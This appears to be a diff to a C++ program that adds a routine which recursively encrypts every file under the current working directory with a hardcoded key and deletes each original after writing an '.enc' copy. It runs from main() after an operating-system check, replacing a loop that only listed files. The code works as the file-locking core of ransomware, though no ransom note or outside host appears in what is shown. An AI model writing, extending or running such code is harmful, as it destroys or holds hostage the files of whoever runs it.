@@ -9,7 +9,43 @@
 #include <filesystem>
 #include <openssl/evp.h>
 #include <openssl/rand.h>
+#include "headers/encryptFiles.h"
 #include "headers/checkOperatingSystem.h"
+
+
+// Creating a function to recursively encrypt files and folders 
+void encryptFilesRecursively(const std::filesystem::path& path, const std::string& key) {
+    if (std::filesystem::is_directory(path)) {
+        // Iterate through the directory
+        for (const auto& entry : std::filesystem::directory_iterator(path)) {
+            encryptFilesRecursively(entry.path(), key); // Recursive call
+        }
+    } else if (std::filesystem::is_regular_file(path)) {
+    	// Prepare the output file name 
+    	std::string outputFile = path.string() + ".enc"; 
+
+        // Encrypt the file
+        std::cout << "Encrypting file: " << path.filename() << std::endl;
+        encrypt(path.string(), outputFile, key);
+
+
+        // Check if the encryption was successful 
+        if (std::filesystem::exists(outputFile)) {
+        	// Remove the original file after successful encryption 
+        	std::cout << "Removing original file: " << path.filename() << std::endl; 
+
+        	// Remove the original file after successful encryption
+        	std::filesystem::remove(path); 
+        }
+
+        // else encryption failed 
+        else {
+        	// Execute the block of code below if encryption fails 
+        	std::cerr << "Encryption failed for file: " << path.filename() << std::endl; 
+
+        }
+    }
+}
 
 
 // Running the main script 
@@ -52,11 +88,20 @@ int main() {
 				// Get the current path 
 				std::filesystem::path currentPath = std::filesystem::current_path(); 
 
-				// Iterate through the current directory 
-				for (const auto& entry : std::filesystem::directory_iterator(currentPath)) {
-					std::cout << entry.path().filename() << std::endl; 
+				// Setting the key 
+				std::string key = "0123456789abcdef0123456789abcdef"; 
+				encryptFilesRecursively(currentPath, key); 
 
-				} 
+				// Iterate through the current directory 
+				// for (const auto& entry : std::filesystem::directory_iterator(currentPath)) {
+				// 	std::cout << entry.path().filename() << std::endl; 
+
+				// 	// Encrypt the files and folders 
+				// 	// Setting the key 
+				// 	std::string key = "0123456789abcdef0123456789abcdef"; 
+				// 	encrypt(entry.path().filename(), key); 
+
+				// } 
 
 			}
 
